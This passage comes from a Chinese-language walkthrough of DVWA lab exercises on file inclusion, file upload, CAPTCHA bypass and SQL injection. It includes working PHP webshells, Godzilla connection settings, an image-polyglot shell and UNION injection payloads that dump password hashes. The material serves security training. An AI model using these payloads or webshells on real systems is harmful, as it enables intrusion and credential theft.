使用file协议，访问：[http://localhost/DVWA/vulnerabilities/fi/?page=file:///var/www/html/DVWA/vulnerabilities/fi/test.txt](http://localhost/DVWA/vulnerabilities/fi/?page=file:///var/www/html/DVWA/vulnerabilities/fi/test.txt)

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1752483140890-e4294c58-b665-4805-a45a-9ed327f5ae41.png)

成功返回了

## 五、文件上传（File Upload）
### 前言
文件上传漏洞，通常是由于对上传文件的类型、内容没有进行严格的过滤、检查，使得攻击者可以通过上传木马获取服务器的webshell权限。

### 难度low
审计代码

```plain
<?php

if( isset( $_POST[ 'Upload' ] ) ) {
    // Where are we going to be writing to?
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

    // Can we move the file to the upload folder?
    if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {
        // No
        echo '<pre>Your image was not uploaded.</pre>';
    }
    else {
        // Yes!
        echo "<pre>{$target_path} succesfully uploaded!</pre>";
    }
}

?>
```

服务器对上传文件的类型、内容没有做任何的检查、过滤，存在明显的文件上传漏洞，生成上传路径后，服务器会检查是否上传成功并返回相应提示信息。

创建文件：

在/home/kali目录下创建文件

```plain
echo '<?php
	echo shell_exec($_GET["cmd"]);
?>' > webshell.php
```

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1753075579731-2ebda344-8dd8-472d-ad93-c22a2aa95d92.png)

测试一下，查看系统信息[http://localhost/DVWA/hackable/uploads/webshell.php?cmd=uname](http://localhost/DVWA/hackable/uploads/webshell.php?cmd=uname) -a

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1753075845279-f5cfa1b1-ec01-4248-96bb-a79b0611da1e.png)

查看当前目录的完整路径[http://localhost/DVWA/hackable/uploads/webshell.php?cmd=pwd](http://localhost/DVWA/hackable/uploads/webshell.php?cmd=pwd)

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1753075917766-3c6086f3-e1d1-443f-bbb2-670b8eda4b3c.png)

查看系统进程[http://localhost/DVWA/hackable/uploads/webshell.php?cmd=ps](http://localhost/DVWA/hackable/uploads/webshell.php?cmd=ps) aux | head -10

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1753075955439-c22c034d-d493-4c43-9995-5e70ff4e337f.png)

### 难度medium
审计代码

```plain
<?php

if( isset( $_POST[ 'Upload' ] ) ) {
    // Where are we going to be writing to?
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

    // File information
    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
    $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ];
    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];

    // Is it an image?
    if( ( $uploaded_type == "image/jpeg" || $uploaded_type == "image/png" ) &&
        ( $uploaded_size < 100000 ) ) {

        // Can we move the file to the upload folder?
        if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {
            // No
            echo '<pre>Your image was not uploaded.</pre>';
        }
        else {
            // Yes!
            echo "<pre>{$target_path} succesfully uploaded!</pre>";
        }
    }
    else {
        // Invalid file
        echo '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>';
    }
}

?>
```

扩展名检查：只允许 jpeg、png

文件大小限制：小于100KB

创建文件

```plain
echo '<?php @eval($_POST["cmd"]); ?>' > webshell.php
```

burpsuite抓包

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1753235309325-2c607b43-a85f-4694-905d-3d4f273eda68.png)

改成Content-Type: image/jpeg

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1753235354411-9cd8bed3-374c-4d05-a3de-0dee4b88b78b.png)

成功上传了

启动哥斯拉Godzilla

哥斯拉启动命令 sudo java -jar /usr/share/Godzilla.jar

配置如下：

URL: [http://localhost/DVWA/hackable/uploads/webshell.php](http://localhost/DVWA/hackable/uploads/webshell.php)

Password: cmd

Key: key

Payload: PHP_DYNAMIC_PAYLOAD (或 PHP)

Encryptor: PHP_BASE64 (或 BASE64)

Encoding: BASE64

Proxy type: NO_PROXY (如果不用代理)

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1753235702865-7a56a598-2195-43d2-95f7-329360e74451.png)

成功后Add添加，右键Enter连接

命令行执行

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1753236071501-62e3f9aa-9e7b-4d0e-9673-f1cf4d2fa9dd.png)

查看文件系统

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1753235906995-511a496c-c91e-4a0e-add4-a36091e25e1b.png)

### 难度high
```plain
<?php

if( isset( $_POST[ 'Upload' ] ) ) {
    // Where are we going to be writing to?
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

    // File information
    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1);
    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];
    $uploaded_tmp  = $_FILES[ 'uploaded' ][ 'tmp_name' ];

    // Is it an image?
    if( ( strtolower( $uploaded_ext ) == "jpg" || strtolower( $uploaded_ext ) == "jpeg" || strtolower( $uploaded_ext ) == "png" ) &&
        ( $uploaded_size < 100000 ) &&
        getimagesize( $uploaded_tmp ) ) {

        // Can we move the file to the upload folder?
        if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) {
            // No
            echo '<pre>Your image was not uploaded.</pre>';
        }
        else {
            // Yes!
            echo "<pre>{$target_path} succesfully uploaded!</pre>";
        }
    }
    else {
        // Invalid file
        echo '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>';
    }
}

?>
```

扩展名检查：只允许 jpg、jpeg、png

文件大小限制：小于100KB

图片格式验证：使用 getimagesize() 验证文件是否为真实图片

制作图片马

先准备一张正常图片cat.jpg，和之前的一句话木马合起来（需要放在后面，他会检查头部）

```plain
cat cat.jpg webshell.php > shell.jpg
```

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1753258798968-eac7d0b6-e33b-453d-8cf2-7e0377951ab2.png)

tail这个图片文件看一下

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1753258850743-148fc430-ecea-4bd1-b253-152c0eae39d7.png)

我用了burpsuite重放，不过直接传就可以成功的

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1753258979258-2777e4f4-0558-4aee-9909-e421f0036eb5.png)

返回../../hackable/uploads/shell.jpg succesfully uploaded!

结合文件包含漏洞，把安全级别调到low，

访问url[localhost/DVWA/vulnerabilities/fi/?page=../../hackable/uploads/shell.jpg](http://localhost/DVWA/vulnerabilities/fi/?page=../../hackable/uploads/shell.jpg)

burisuite抓包把整个请求头复制到哥斯拉的Request configuration里

url填写刚才访问的url，密码和其他配置还是和难度medium一样

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1753407427373-fa11bc46-cc6d-4aeb-905d-223862b3edda.png)

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1753407528931-8fd6ac33-7bd5-46f4-93b0-88abb696ee40.png)

进来了

## 六、不安全验证（Insecure CAPTCHA）
### 前言
CAPTCHA是谷歌提供的一种用户验证服务，全称为：Completely Automated Public Turing Test to Tell Computers and Humans Apart(全自动区分计算机和人类的图灵测试)，简单来说就是用来区分人类和计算机的一种手段，可以很有效的防止恶意软件、工具人大量调用系统功能，比如注册、登录等。

### 难度low
审计代码

```plain
<?php

if (isset($_POST['Change']) && ($_POST['step'] == '1')) { 
    // Step 1: 用户提交了第一个表单，并且是第一步
    $hide_form = true; // 标识隐藏CAPTCHA表单

    // 获取用户输入的新密码和确认密码
    $pass_new  = $_POST['password_new'];
    $pass_conf = $_POST['password_conf'];

    // 通过第三方服务检查CAPTCHA
    $resp = recaptcha_check_answer(
        $_DVWA['recaptcha_private_key'],
        $_POST['g-recaptcha-response']
    );

    // CAPTCHA验证未通过
    if (!$resp) {
        $html     .= "<pre><br />The CAPTCHA was incorrect. Please try again.</pre>";
        $hide_form = false; // 如果错误，不隐藏表单
        return;
    } else {
        // CAPTCHA验证通过，检查两次输入的密码是否匹配
        if ($pass_new == $pass_conf) {
            // 如果匹配，让用户确认更改
            $html .= "
                <pre><br />You passed the CAPTCHA! Click the button to confirm your changes.<br /></pre>
                <form action=\"#\" method=\"POST\">
                    <input type=\"hidden\" name=\"step\" value=\"2\" />
                    <input type=\"hidden\" name=\"password_new\" value=\"{$pass_new}\" />
                    <input type=\"hidden\" name=\"password_conf\" value=\"{$pass_conf}\" />
                    <input type=\"submit\" name=\"Change\" value=\"Change\" />
                </form>";
        } else {
            // 两次输入的密码不匹配
            $html     .= "<pre>Both passwords must match.</pre>";
            $hide_form = false; // 不隐藏表单，提示用户重新输入
        }
    }
}
if (isset($_POST['Change']) && ($_POST['step'] == '2')) { 
    // Step 2: 用户提交确认后的表单，进行更改操作
    $hide_form = true; // 隐藏CAPTCHA表单

    // 获取用户输入的新密码和确认密码
    $pass_new  = $_POST['password_new'];
    $pass_conf = $_POST['password_conf'];

    // 确认两个密码匹配
    if ($pass_new == $pass_conf) {
        // 对特殊字符进行转义，防止SQL注入
        $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $pass_new) : "");

        // 将密码进行md5加密（注：md5已不再安全，实际应用中应使用更安全的加密方式）
        $pass_new = md5($pass_new);

        // 更新数据库中当前用户的密码
        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
        $result = mysqli_query($GLOBALS["___mysqli_ston"], $insert) or die('<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>');

        // 给用户反馈密码已更改
        $html .= "<pre>Password Changed.</pre>";
    } else {
        // 两次输入的密码不匹配
        $html .= "<pre>Passwords did not match.</pre>";
        $hide_form = false; // 提示错误，不隐藏表单
    }

    // 关闭数据库连接
    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}
?>
```

按它的提示去配置一番，随便配个123和abc（我用vim去改的）

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1753423347029-a7ed1b3b-8963-4f1b-8094-f945efe11e96.png)

需要科学上网

服务器将改密操作分成了两步，第一步检查用户输入的验证码，验证通过后，服务器返回表单，第二步客户端提交post请求，服务器完成更改密码的操作。但是，这其中存在明显的逻辑漏洞，服务器仅仅通过检查Change、step 参数来判断用户是否已经输入了正确的验证码。我们可以用bp抓包修改参数，进行绕过，达到成功修改密码。

burpsuite抓包

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1753840500789-cf3958e0-46a2-4c25-89d3-1fc18e60c798.png)

把这个step=1改成step=2再重放

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1753840555169-03c9553a-1af3-4421-bd1b-56d5888538ab.png)

### 难度medium
审计代码

```plain
<?php
 
if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '1' ) ) {
    // Hide the CAPTCHA form
    $hide_form = true;
 
    // Get input
    $pass_new  = $_POST[ 'password_new' ];
    $pass_conf = $_POST[ 'password_conf' ];
 
    // Check CAPTCHA from 3rd party
    $resp = recaptcha_check_answer(
        $_DVWA[ 'recaptcha_private_key' ],
        $_POST['g-recaptcha-response']
    );
 
    // Did the CAPTCHA fail?
    if( !$resp ) {
        // What happens when the CAPTCHA was entered incorrectly
        $html     .= "<pre><br />The CAPTCHA was incorrect. Please try again.</pre>";
        $hide_form = false;
        return;
    }
    else {
        // CAPTCHA was correct. Do both new passwords match?
        if( $pass_new == $pass_conf ) {
            // Show next stage for the user
            echo "
                <pre><br />You passed the CAPTCHA! Click the button to confirm your changes.<br /></pre>
                <form action=\"#\" method=\"POST\">
                    <input type=\"hidden\" name=\"step\" value=\"2\" />
                    <input type=\"hidden\" name=\"password_new\" value=\"{$pass_new}\" />
                    <input type=\"hidden\" name=\"password_conf\" value=\"{$pass_conf}\" />
                    <input type=\"hidden\" name=\"passed_captcha\" value=\"true\" />
                    <input type=\"submit\" name=\"Change\" value=\"Change\" />
                </form>";
        }
        else {
            // Both new passwords do not match.
            $html     .= "<pre>Both passwords must match.</pre>";
            $hide_form = false;
        }
    }
}
 
if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '2' ) ) {
    // Hide the CAPTCHA form
    $hide_form = true;
 
    // Get input
    $pass_new  = $_POST[ 'password_new' ];
    $pass_conf = $_POST[ 'password_conf' ];
 
    // Check to see if they did stage 1  查看passed_captcha是否设置,设置了继续,反之否之。
    if( !$_POST[ 'passed_captcha' ] ) {
        $html     .= "<pre><br />You have not passed the CAPTCHA.</pre>";
        $hide_form = false;
        return;
    }
 
    // Check to see if both password match
    if( $pass_new == $pass_conf ) {
        // They do!
        $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
        $pass_new = md5( $pass_new );
 
        // Update database
        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
 
        // Feedback for the end user
        echo "<pre>Password Changed.</pre>";
    }
    else {
        // Issue with the passwords matching
        echo "<pre>Passwords did not match.</pre>";
        $hide_form = false;
    }
 
    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}
 
?> 
```

我们可以看到，Medium级别的代码在第二步处理逻辑上加入了对验证码是否通过(passed_captcha)的判定，如果passed_captcha为true，则认为验证码正确

burpsuite抓包

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1753844649793-ba2e074d-0cf6-4095-b8ba-789faf380c95.png)

把step=1改成step=2，末尾加个 passed_captcha=true 再重放

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1753844783468-91830ead-99d4-47a1-bc4e-86cb4b5ad961.png)

### 难度high
审计代码

```plain
<?php
 
if( isset( $_POST[ 'Change' ] ) ) {
    // Hide the CAPTCHA form
    $hide_form = true;
 
    // Get input
    $pass_new  = $_POST[ 'password_new' ];
    $pass_conf = $_POST[ 'password_conf' ];
 
    // Check CAPTCHA from 3rd party  检验密码的正确性
    $resp = recaptcha_check_answer(
        $_DVWA[ 'recaptcha_private_key' ],
        $_POST['g-recaptcha-response']
    );
 
    if (
        $resp || 
        (
            $_POST[ 'g-recaptcha-response' ] == 'hidd3n_valu3'  //对密码进行加密
            && $_SERVER[ 'HTTP_USER_AGENT' ] == 'reCAPTCHA'
        )
    ){
        // CAPTCHA was correct. Do both new passwords match?  连接数据库对密码进行杀毒，md5
        if ($pass_new == $pass_conf) {
            $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
            $pass_new = md5( $pass_new );
 
            // Update database   执行语句并修改数据库内容。
            $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "' LIMIT 1;";
            $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
 
            // Feedback for user
            echo "<pre>Password Changed.</pre>";
 
        } else {
            // Ops. Password mismatch
            $html     .= "<pre>Both passwords must match.</pre>";
            $hide_form = false;
        }
 
    } else {
        // What happens when the CAPTCHA was entered incorrectly
        $html     .= "<pre><br />The CAPTCHA was incorrect. Please try again.</pre>";
        $hide_form = false;
        return;
    }
 
    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}
 
// Generate Anti-CSRF token  预防CSRF攻击
generateSessionToken();
 
?> 
```

$_POST[ 'g-recaptcha-response' ] == 'hidd3n_valu3'

&& $_SERVER[ 'HTTP_USER_AGENT' ] == 'reCAPTCHA'

验证逻辑是当$resp（这里是指谷歌返回的验证结果）是false，并且参数g-recaptcha-response不等于hidd3n_valu3（或者http包头的User-Agent参数不等于reCAPTCHA）时，就认为验证码输入错误，反之则认为已经通过了验证码的检查。

burpsuite抓包

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1753845011841-f3b41ec5-46b8-4357-bfd1-ba0bb3bc2ce7.png)

修改g-recaptcha-response==hidd3n_valu3，User-Agent:reCAPTCHA后重放

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1753845229059-ad746c63-15c2-41cf-bd3f-dd22109c60e3.png)

## 七、SQL注入（SQL Injection）
### 前言
SQL 注入攻击就是 Web 程序对用户的输入没有进行合法性判断，从而攻击者可以从前端向后端传入攻击参数，并且该参数被带入了后端执行。在很多情况下开发者会使用动态的 SQL 语句，这种语句是在程序执行过程中构造的，不过动态的 SQL 语句很容易被攻击者传入的参数改变其原本的功能。

当我们进行手工 SQL 注入时，往往是采取以下几个步骤：

判断是否存在注入，注入是字符型还是数字型

1. 猜解SQL查询语句中的字段数；
2. 确定显示的字段顺序；
3. 获取当前数据库；
4. 获取数据库中的表；
5. 获取表中的字段名；
6. 下载数据。

当开发者需要防御 SQL 注入攻击时，可以采用以下方法：

1. 过滤危险字符：可以使用正则表达式匹配各种 SQL 子句，例如 select,union,where 等，如果匹配到则退出程序。
2. 使用预编译语句：PDO 提供了一个数据访问抽象层，这意味着不管使用哪种数据库，都可以用相同的函数（方法）来查询和获取数据。使用 PDO 预编译语句应该使用占位符进行数据库的操作，而不是直接将变量拼接进去。

### 难度low
审计代码

```plain
<?php

if(isset( $_REQUEST['Submit'])){
    // Get input
    $id = $_REQUEST['id'];

    // Check database
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query) or die('<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>');

    // Get results
    while($row = mysqli_fetch_assoc($result)){
        // Get values
        $first = $row["first_name"];
        $last  = $row["last_name"];

        // Feedback for end user
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
    }

    mysqli_close($GLOBALS["___mysqli_ston"]);
}

?>
```

未过滤用户输入

$_REQUEST['id']直接拼接到SQL语句中

错误信息暴露

die('<pre>' . mysqli_error(...)) 输出详细数据库错误，帮助攻击者探测数据库结构

由于输入的数据 id 是数字，我们并不知道服务器将 id 的值认为是字符还是数字，因此我们需要先来判断是数字型注入还是字符型注入(虽然从源码看得出来)。当输入的参数为字符串时就称该 SQL 注入为字符型，当输入的参数为数字时就称该 SQL 注入为数字型。字符型和数字型最大的一个区别在于数字型不需要单引号来闭合，而字符型需要通过单引号来闭合。

输入 1'，可以看到服务器回显出错了，而且从回显的信息也能看出多了一个单引号。因此这是字符型注入。

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1753853239194-f6cb5781-9f7a-4c61-9f07-ccfcd5e6a56f.png)

SQL 查询一般需要 WHERE 语句来筛选我希望查询到的字段。第一个单引号闭合了 SQL 查询语句的单引号，理论上来说这个条件只有 id = 1 的用户信息能满足。但是这个时候我们加入了一个或运算 “1 = 1”，这个条件是恒成立的，而当查询到用户的 id != 1 时，SQL 就会判断 or 运算符后面的条件是否成立。由于 “1 = 1” 恒成立，因此无论是什么数据都是符合要求的，都会被回显。

```plain
1' or '1' = '1
```

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1753853540883-2c2598b0-c4f2-4594-9f55-c4db69273296.png)

接下来我们需要判断可查询的字段数，OEDER BY 子句可以对查询结果按某一列排序，我们可以使用该子句判断该表有几列是可控的。例如注入以下代码，发现按照第一列排序能够成功回显。注意这里要用到 “#”，该符号在 MySql 里面表示注释，能够把语句后面的内容注释掉，这里主要用来忽略查询语句后面的单引号。

```plain
' or 1 = 1 order by 1 #
```

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1753853579697-3e796ca3-e4e8-4040-a030-0b18b2f99de7.png)

测试到第三列发现服务器报错了，这表示该表的前 2 列是可控的。

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1753853614073-fa522bff-d3eb-4991-bea0-fd42bd0ac721.png)

接下来我们需要判断回显的字段按照顺序输出，这步需要使用联合查询来实现。所谓组合查询就是执行多个 SELECT，然后将这些查询结果进行合并，最后返回一个结果。测试时可以使用 “SELECT 常数” 的写法，运行效果如下，MySql 会直接返回常数。

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1753853643950-c8673230-0db2-4055-b96e-ca3853028f88.png)

```plain
1' union select 1,2 #
```

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1753853667278-5acaa742-db85-4939-b46a-9a6796573818.png)

虽然有源码，但是根据上面的测试内容，我们可以推断出服务器使用的 SQL 语句如下:

```plain
select First name,Surname from 表 where ID = ’id’;
```

接下来开始获取：

获取数据库名

```plain
1' UNION SELECT 1,database() from information_schema.schemata#
```

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1753852565687-82708532-2428-4bab-8c52-3875be57dae3.png)

数据库名：dvwa

获取表名

```plain
1' UNION SELECT 1,table_name from information_schema.tables where table_schema='dvwa'#
```

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1753852612704-fc6d571c-1474-48ca-9d28-8df3886866a4.png)

有两个表 guestbook、users

获取列名

```plain
1' UNION SELECT 1,column_name from information_schema.columns where table_schema='dvwa' and table_name='users'#
```

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1753852657642-8d2bb2fd-7cb0-4002-bd94-c04a16f294e7.png)

获取数据 

为了避免分不清各个数据，使用":"，即0x3a进行分隔

```plain
1' UNION SELECT 1,group_concat(user,0x3a,avatar) from users#
```

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1753852721787-2df5f6e3-ad47-454c-b730-ef7a9a4fdf63.png)

### 难度medium
审计代码

```plain
<?php

if(isset($_POST['Submit'])){
    // Get input
    $id = $_POST['id'];

    $id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id);

    $query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
    $result = mysqli_query($GLOBALS["___mysqli_ston"], $query) or die( '<pre>' . mysqli_error($GLOBALS["___mysqli_ston"]) . '</pre>' );

    // Get results
    while($row = mysqli_fetch_assoc($result)){
        // Display values
        $first = $row["first_name"];
        $last  = $row["last_name"];

        // Feedback for end user
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
    }

}

// This is used later on in the index.php page
// Setting it here so we can close the database connection in here like in the rest of the source scripts
$query  = "SELECT COUNT(*) FROM users;";
$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
$number_of_rows = mysqli_fetch_row( $result )[0];

mysqli_close($GLOBALS["___mysqli_ston"]);
?>
```

源码使用了 mysql_real_escape_string() 函数转义字符串中的特殊字符。也就是说特殊符号 \x00、\n、\r、\、'、" 和 \x1a 都将进行转义。同时前端页面的输入框删改成了下拉选择表单。

burpsuite抓包

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1753854557706-0231d61d-e1e5-4780-99df-e1a0e7419e37.png)

修改 id 为下面内容，服务器回显报错信息。

```plain
1' or 1 = 1 #
```

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1753854618956-8b95641c-8b4f-472c-8aba-116fa76b1431.png)

传递下面的内容，服务器查询成功，由此可见查询语句不需要用单引号来闭合，这是数字型注入。

```plain
1 or 1 = 1 #
```

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1753854663591-20e7928f-b369-4e9e-8770-75788a5bbdb6.png)

由于是数字型注入，服务器端的 mysql_real_escape_string 函数就起不到防御作用了，因为数字型注入并不需要借助引号。

抓包更改参数 id 为如下内容，服务器回显查询结果。

```plain
1 order by 2 #
```

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1753854964744-0296d7b7-f13a-48fa-9e04-100add6daf3e.png)

抓包更改参数 id 为如下内容，服务器报错，说明执行的 SQL 查询语句中只有两个字段。

```plain
1 order by 3 #
```

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1753855086859-859f1dfa-f4e8-4d69-b729-983b86e9eb06.png)

接下来确定显示的字段顺序，抓包更改参数 id 如下，查询成功。

```plain
1 union select 1,2 #
```

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1753855148349-8cf56ef3-65d9-4530-a17d-b52df0ccdc37.png)

获取表中的字段名

注入如下内容，获取当前使用的表名。由于单引号会被过滤，因此不获取当前的数据库名，直接使用 database() 来查询。

```plain
1 union select 1,group_concat(table_name) from information_schema.tables where table_schema = database() #
```

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1753855629960-14f814aa-c5ea-4952-b34e-4c83612803be.png)

由于单引号会被过滤，因此不能直接查询 user 表。此时可以使用十六进制编码绕过，注入如下内容，获取当前使用的表的具体字段名。

```plain
1 union select 1,group_concat(column_name) from information_schema.columns where table_name = 0x7573657273 #
```

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1753855781690-76f74a94-2606-4c94-a651-579670c8ddb6.png)

接下来构造 payload，直接获取 password 字段值。

```plain
1 or 1 = 1 union select group_concat(user_id),group_concat(password) from users #
```

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1753855859202-46dbb252-8c6a-4f57-821f-a16ab2a96305.png)

随便取一个解密一下

md5在线解密[https://www.cmd5.com/default.aspx](https://www.cmd5.com/default.aspx)

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1753856002810-b6d1ca32-4712-4555-ae42-cbb870fe0661.png)

### 难度high
审计代码

```plain
<?php

if(isset($_SESSION ['id'])){
    // Get input
    $id = $_SESSION['id'];

    // Check database
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
    $result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '<pre>Something went wrong.</pre>' );

    // Get results
    while($row = mysqli_fetch_assoc($result)){
        // Get values
        $first = $row["first_name"];
        $last  = $row["last_name"];

        // Feedback for end user
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);        
}

?> 
```

源码如下，与 Medium 级别的代码相比，High 级别的只是在 SQL 查询语句中添加了 LIMIT 1，这令服务器仅回显查询到的一个结果。

虽然查询语句添加了 LIMIT 1，但是可以利用 “#” 把它注释掉，这种防御形同虚设。此时手工注入的过程与 Low 级别基本一样，直接给出最终的 payload。

```plain
1' or 1 = 1 union select group_concat(user_id),group_concat(password) from users #
```

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1753858444345-3f303757-3771-4817-bf28-0232dd6c5530.png)查询内容提交和结果显示使用不同页面显示的防御功能是为了防止注入工具例如 sqlmap 注入。因为 sqlmap 在注入过程中无法在查询提交页面上获取查询的结果，因此收不到任何反馈，也就没办法进一步注入。

## 八、SQL盲注（SQL Injection (Blind)）
### 前言
 盲注，与一般注入的区别在于，一般的注入攻击者可以直接从页面上看到注入语句的执行结果，而盲注时攻击者通常是无法从显示页面上获取执行结果，甚至连注入语句是否执行都无从得知，因此盲注的难度要比一般注入高。盲注分为三类：基于布尔SQL盲注、基于时间的SQL盲注、基于报错的SQL盲注。

 盲注思路步骤：

1. 判断是否存在注入，注入是字符型还是数字型
2. 猜解当前数据库名
3. 猜解数据库中的表名
4. 猜解表中的字段名
5. 猜解数据

### 难度low
审计代码

```plain
<?php 

if( isset( $_GET[ 'Submit' ] ) ) { 
    // Get input 
    $id = $_GET[ 'id' ]; 

    // Check database 
    $getid  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';"; 
    $result = mysql_query( $getid ); // Removed 'or die' to suppress mysql errors 

    // Get results 
    $num = @mysql_numrows( $result ); // The '@' character suppresses errors 
    if( $num > 0 ) { 
        // Feedback for end user 
        echo '<pre>User ID exists in the database.</pre>'; 
    } 
    else { 
        // User wasn't found, so the page wasn't! 
        header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' ); 

        // Feedback for end user 
        echo '<pre>User ID is MISSING from the database.</pre>'; 
    } 

    mysql_close(); 
} 

?> 
```

对参数id没有做任何检查、过滤

判断是否存在注入，注入类型

输入1，显示User ID exists in the database. 

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1753925032383-78479197-8259-4c38-9aaf-44301382ee43.png)

再输入  1' and 1=1 # ，显示User ID exists in the database. 

